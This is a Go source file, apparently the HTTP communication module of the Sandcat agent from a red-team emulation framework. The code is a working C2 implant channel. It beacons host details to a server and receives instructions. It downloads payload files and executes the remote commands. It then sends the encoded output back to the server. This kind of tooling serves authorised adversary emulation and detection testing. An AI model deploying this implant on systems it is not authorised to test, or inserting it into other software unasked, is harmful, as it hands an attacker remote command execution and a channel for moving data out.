package contact

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"path/filepath"
	"runtime"
	"strings"

	"../execute"
	"../util"
	"../output"
)

var (
	apiBeacon = "/beacon"
	apiResult = "/result"
)

//API communicates through HTTP
type API struct { }

func init() {
	CommunicationChannels["HTTP"] = API{}
}

//GetInstructions sends a beacon and returns instructions
func (contact API) GetInstructions(profile map[string]interface{}) map[string]interface{} {
	data, _ := json.Marshal(profile)
	address := fmt.Sprintf("%s%s", profile["server"], apiBeacon)
	bites := request(address, data)
	var out map[string]interface{}
	if bites != nil {
		output.VerbosePrint("[+] beacon: ALIVE")
		var commands interface{}
		json.Unmarshal(bites, &out)
		json.Unmarshal([]byte(out["instructions"].(string)), &commands)
		out["sleep"] = int(out["sleep"].(float64))
		out["watchdog"] = int(out["watchdog"].(float64))
		out["instructions"] = commands
	} else {
		output.VerbosePrint("[-] beacon: DEAD")
	}
	return out
}

//DropPayloads downloads all required payloads for a command
func (contact API) DropPayloads(payload string, server string, uniqueId string) []string{
	payloads := strings.Split(strings.Replace(payload, " ", "", -1), ",")
	var droppedPayloads []string
	for _, payload := range payloads {
		if len(payload) > 0 {
			droppedPayloads = append(droppedPayloads, drop(server, payload))
		}
	}
	return droppedPayloads
}

//RunInstruction runs a single instruction
func (contact API) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
    timeout := int(command["timeout"].(float64))
	cmd, result, status, pid := execute.RunCommand(command["command"].(string), payloads, profile["platform"].(string), command["executor"].(string), timeout)
	sendExecutionResults(command["id"], profile["server"], result, status, cmd, pid)
}

//C2RequirementsMet determines if sandcat can use the selected comm channel
func (contact API) C2RequirementsMet(criteria map[string]string) bool {
	output.VerbosePrint(fmt.Sprintf("Beacon API=%s", apiBeacon))
	output.VerbosePrint(fmt.Sprintf("Result API=%s", apiResult))
	return true
}

func drop(server string, payload string) string {
	location := filepath.Join(payload)
	if len(payload) > 0 && util.Exists(location) == false {
		output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload: %s", payload))
		address := fmt.Sprintf("%s/file/download", server)
		req, _ := http.NewRequest("POST", address, nil)
		req.Header.Set("file", payload)
		req.Header.Set("platform", string(runtime.GOOS))
		client := &http.Client{}
		resp, err := client.Do(req)
		if err == nil && resp.StatusCode == ok {
			util.WritePayload(location, resp)
		}
	}
	return location
}

func sendExecutionResults(commandID interface{}, server interface{}, result []byte, status string, cmd string, pid string) {
	address := fmt.Sprintf("%s%s", server, apiResult)
	link := fmt.Sprintf("%s", commandID.(string))
	data, _ := json.Marshal(map[string]string{"id": link, "output": string(util.Encode(result)), "status": status, "pid": pid})
	request(address, data)
}

func request(address string, data []byte) []byte {
	req, _ := http.NewRequest("POST", address, bytes.NewBuffer(util.Encode(data)))
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := ioutil.ReadAll(resp.Body)
	return util.Decode(string(body))
}
